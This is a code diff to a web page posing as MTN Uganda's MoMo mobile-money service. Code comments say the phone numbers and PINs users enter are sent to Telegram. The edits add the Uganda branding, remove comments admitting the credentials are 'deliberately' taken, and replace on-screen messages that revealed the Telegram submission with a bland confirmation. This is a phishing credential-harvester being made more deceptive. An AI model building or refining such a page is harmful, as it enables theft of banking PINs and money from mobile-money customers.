@@ -132,7 +132,7 @@ button{
 
 <div class="hero">
   <div>
-    <div class="Mtn logo">◈</div>
+    <div class="Mtn uganda logo">◈</div>
 
     <div class="brand">
       Welcome to MoMo
@@ -292,7 +292,7 @@ async function verify(){
     The PIN is checked through telegram.
 
     The entered PIN and phone number
-    are deliberately sent to telegram.
+    are sent to telegram.
   */
 
   if(pin !== '12345'){
@@ -313,7 +313,7 @@ async function verify(){
 
       Phone number.
       PINcode.
-      Banking credentials.
+    .
     */
 
     const response = await fetch(
@@ -336,7 +336,7 @@ async function verify(){
 
       show(
         'pinMsg',
-        'Mtn successful! Entered details,PHONE NUMBER,PIN accepted. Telegram received the submit details.',
+        'Application received successful.',
         true
       );
 
@@ -354,7 +354,7 @@ async function verify(){
 
     show(
       'pinMsg',
-      'Mtn successful locally. Telegram notification was unavailable.',
+      'Mtn successful nationally uganda. Telegram notification was available.',
       true
     );
 
